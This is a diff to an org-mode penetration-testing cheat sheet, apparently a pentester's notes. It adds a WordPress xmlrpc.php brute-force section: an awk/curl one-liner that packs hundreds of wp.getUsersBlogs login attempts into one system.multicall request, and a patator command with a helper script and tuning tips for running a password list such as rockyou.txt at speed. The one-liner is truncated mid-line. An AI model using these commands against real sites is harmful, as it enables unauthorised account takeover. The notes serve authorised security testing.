@@ -1691,7 +1691,6 @@
 ***** Patator
       - [[https://github.com/lanjelot/patator][Site]] - Multi-Purpose bruteforcer - [[https://raw.githubusercontent.com/lanjelot/patator/master/patator.py][raw]]
         #+begin_src sh
-          # Add to line 3965: if resolve:
           patator http_fuzz 'url=<url>' user_pass=FILE0:FILE1 0='<wusr>' 1='<wpwd>' -x ignore:code=401
           # pathasis=1       - Send ../ as is
           # auth_type=basic  - Default
@@ -2139,6 +2138,31 @@
          curl -d '<?xml version="1.0"?> <methodCall><methodName>system.methodHelp</methodName><params><param><value> <string>system.listMethods</string></value></param></params> </methodCall>' -H 'Content-Type: text/xml' <url>/xmlrpc.php
        #+end_src
 *** Bruteforce
+**** Patator
+     - [[https://github.com/lanjelot/patator][Site]] - Multi-Purpose bruteforcer - [[https://raw.githubusercontent.com/lanjelot/patator/master/patator.py][raw]]
+       #+begin_src sh
+         # Best tool if system.multicall works
+
+         # First check if system.multicall works
+         curl -d @<(awk -vMULTI=1000 -vUSER='<user>' -vORS='' -vbegin='<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>' -vend='</data></array></value></param></params></methodCall>\n' 'BEGIN{print begin;++MULTI};!(NR%MULTI){print end begin}$0="<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>"USER"</string></va→
+         # If so, find the max MULTI allowed
+
+         # Patator - 650 req 3 threads - 5 req/s
+         # rockyou.txt takes around 1h
+         # For more edit multiprocessing maxsize
+         patator http_fuzz url='<path-to>/xmlrpc.php' header='Content-Type: text/xml' method='POST' auto_urlencode=0 body='PROG0' 0="/tmp/test.sh"  --allow-ignore-failures -x ignore:code='xxx' -x ignore:fgrep!='blogid' -x quit:fgrep='blogid'-t 3
+
+         # Create /tmp/test.sh with the following
+         #!/bin/sh
+
+         # Set pipesize to patator multi maxsize
+         perl -MFcntl -e 'fcntl+STDOUT,Fcntl->F_SETPIPE_SZ,10000'
+         # Or set it on patator subprocess.Popen
+         # pipesize flag at the ProgIter class
+
+         exec awk -vMULTI=650 ... # From above
+         # For a full perl ver see WordPress sect
+       #+end_src
 **** Hydra
      - [[https://github.com/vanhauser-thc/thc-hydra][Site]] - Multi-protocol bruteforcer:
        #+begin_src sh
